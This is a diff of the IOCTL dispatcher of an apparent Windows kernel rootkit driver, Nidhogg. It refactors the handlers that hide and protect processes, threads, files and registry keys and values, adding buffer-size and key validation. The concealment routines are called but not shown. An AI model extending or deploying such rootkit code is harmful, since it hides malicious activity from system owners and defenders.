@@ -82,23 +82,16 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		auto data = static_cast<ProcessType*>(Irp->AssociatedIrp.SystemBuffer);
 
 		switch (*data) {
-		case ProcessType::Protected: {
-			NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
-			break;
-		}
-		case ProcessType::Hidden: {
-			NidhoggProcessHandler->ClearProcessList(ProcessType::Hidden);
-			break;
-		}
-		case ProcessType::All: {
-			NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
-			NidhoggProcessHandler->ClearProcessList(ProcessType::Hidden);
-			break;
-		}
-		default: {
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
+			case ProcessType::Protected:
+			case ProcessType::Hidden:
+			case ProcessType::All: {
+				NidhoggProcessHandler->ClearProcessList(*data);
+				break;
+			}
+			default: {
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
 		}
 		break;
 	}
@@ -334,17 +327,10 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		auto data = static_cast<ThreadType*>(Irp->AssociatedIrp.SystemBuffer);
 
 		switch (*data) {
-			case ThreadType::Protected: {
-				NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
-				break;
-			}
-			case ThreadType::Hidden: {
-				NidhoggThreadHandler->ClearThreadList(ThreadType::Hidden);
-				break;
-			}
+			case ThreadType::Protected:
+			case ThreadType::Hidden:
 			case ThreadType::All: {
-				NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
-				NidhoggThreadHandler->ClearThreadList(ThreadType::Hidden);
+				NidhoggThreadHandler->ClearThreadList(*data);
 				break;
 			}
 			default: {
@@ -391,7 +377,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_PROTECT_UNPROTECT_FILE:
 	{
-		ProtectedFile protectedFile{};
+		ProtectedFile protectedFile = { 0 };
 
 		if (!Features.FileProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
@@ -457,7 +443,26 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		NidhoggFileHandler->ClearFilesList(FileType::Protected);
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (!IsValidSize(size, sizeof(FileType))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = static_cast<FileType*>(Irp->AssociatedIrp.SystemBuffer);
+
+		switch (*data) {
+			case FileType::Protected:
+			case FileType::All: {
+				NidhoggFileHandler->ClearFilesList(*data);
+				break;
+			}
+			default: {
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+		}
 		break;
 	}
 
@@ -491,10 +496,9 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		break;
 	}
 
-	case IOCTL_PROTECT_REGITEM:
+	case IOCTL_PROTECT_HIDE_REGITEM:
 	{
-		RegItem regItem{};
-		ULONG itemsCount = 0;
+		RegItem regItem = { 0 };
 
 		if (!Features.RegistryFeatures) {
 			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
@@ -512,8 +516,8 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		regItem.Type = data->Type;
 		SIZE_T keyLen = wcslen(data->KeyPath);
 
-		if (keyLen == 0 || keyLen > REG_KEY_LEN) {
-			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
+		if (!NidhoggRegistryHandler->IsValidKey(data->KeyPath)) {
+			Print(DRIVER_PREFIX "Key is invalid.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -525,11 +529,11 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
+		if (regItem.Type == RegItemType::ProtectedValue || regItem.Type == RegItemType::HiddenValue) {
 			SIZE_T valueLen = wcslen(data->ValueName);
 
-			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
-				Print(DRIVER_PREFIX "Buffer data is invalid.\n");
+			if (!NidhoggRegistryHandler->IsValidValue(data->ValueName)) {
+				Print(DRIVER_PREFIX "Value is invalid.\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
@@ -541,58 +545,26 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 		}
-
-		switch (regItem.Type) {
-		case RegProtectedKey:
-			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
-			break;
-		case RegHiddenKey:
-			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
-			break;
-		case RegProtectedValue:
-			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
-			break;
-		case RegHiddenValue:
-			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
-			break;
-		default:
-			Print(DRIVER_PREFIX "Unknown registry object type.\n");
-			status = STATUS_INVALID_PARAMETER;
+		if (!NidhoggRegistryHandler->AddRegItem(regItem)) {
+			Print(DRIVER_PREFIX "Failed to add registry item\n");
+			status = STATUS_ALREADY_REGISTERED;
 			break;
 		}
-
-		if (!NT_SUCCESS(status))
-			break;
-
-		if (itemsCount == MAX_REG_ITEMS) {
-			Print(DRIVER_PREFIX "List is full.\n");
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
-			break;
-		}
-
-		if (!NidhoggRegistryUtils->FindRegItem(&regItem)) {
-			if (!NidhoggRegistryUtils->AddRegItem(&regItem)) {
-				Print(DRIVER_PREFIX "Failed to add new registry item.\n");
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
-			Print(DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type);
-		}
+		Print(DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type);
 
 		len += size;
 		break;
 	}
 
-	case IOCTL_UNPROTECT_REGITEM:
+	case IOCTL_UNPROTECT_UNHIDE_REGITEM:
 	{
-		RegItem regItem{};
+		RegItem regItem = { 0 };
 
 		if (!Features.RegistryFeatures) {
 			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
 		if (!IsValidSize(size, sizeof(RegItem))) {
@@ -600,13 +572,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-
 		auto data = static_cast<RegItem*>(Irp->AssociatedIrp.SystemBuffer);
 		regItem.Type = data->Type;
 		SIZE_T keyLen = wcslen(data->KeyPath);
 
-		if (!VALID_REG_TYPE(regItem.Type) || keyLen == 0 || keyLen > REG_KEY_LEN) {
-			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
+		if (!NidhoggRegistryHandler->IsValidKey(data->KeyPath)) {
+			Print(DRIVER_PREFIX "Key is invalid.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -618,11 +589,11 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
+		if (regItem.Type == RegItemType::ProtectedValue || regItem.Type == RegItemType::HiddenValue) {
 			SIZE_T valueLen = wcslen(data->ValueName);
 
-			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
-				Print(DRIVER_PREFIX "Buffer data is invalid.\n");
+			if (!NidhoggRegistryHandler->IsValidValue(data->ValueName)) {
+				Print(DRIVER_PREFIX "Value is invalid.\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
@@ -634,12 +605,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 		}
-
-		if (!NidhoggRegistryUtils->RemoveRegItem(&regItem)) {
-			Print(DRIVER_PREFIX "Registry item not found.\n");
-			status = STATUS_NOT_FOUND;
+		if (!NidhoggRegistryHandler->RemoveRegItem(regItem)) {
+			Print(DRIVER_PREFIX "Failed to remove registry item\n");
+			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
+		Print(DRIVER_PREFIX "Removed registry item of type %d.\n", regItem.Type);
 
 		len += size;
 		break;
@@ -653,54 +624,47 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		NidhoggRegistryUtils->ClearRegItems();
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (!IsValidSize(size, sizeof(RegItemType))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = static_cast<RegItemType*>(Irp->AssociatedIrp.SystemBuffer);
+
+		switch (*data) {
+			case RegItemType::HiddenKey:
+			case RegItemType::ProtectedKey:
+			case RegItemType::ProtectedValue:
+			case RegItemType::HiddenValue: {
+				NidhoggRegistryHandler->ClearRegistryList(*data);
+				break;
+			}
+			default: {
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+		}
 		break;
 	}
 
 	case IOCTL_LIST_REGITEMS:
 	{
-		ULONG itemsCount = 0;
 
 		if (!Features.RegistryFeatures) {
 			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (!IsValidSize(size, sizeof(RegItem))) {
+		if (!IsValidSize(size, sizeof(IoctlRegistryList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<RegItem*>(Irp->AssociatedIrp.SystemBuffer);
-
-		switch (data->Type) {
-		case RegProtectedKey:
-			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
-			break;
-		case RegHiddenKey:
-			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
-			break;
-		case RegProtectedValue: {
-			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
-			break;
-		}
-		case RegHiddenValue: {
-			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
-			break;
-		}
-		default:
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
-
-		if (!NT_SUCCESS(status) || data->RegItemsIndex > itemsCount) {
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
-
-		if (itemsCount > 0)
-			status = NidhoggRegistryUtils->QueryRegItem(data);
+		auto data = static_cast<IoctlRegistryList*>(Irp->AssociatedIrp.SystemBuffer);
+		status = NidhoggRegistryHandler->ListRegistryItems(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 
 		len += size;
 		break;
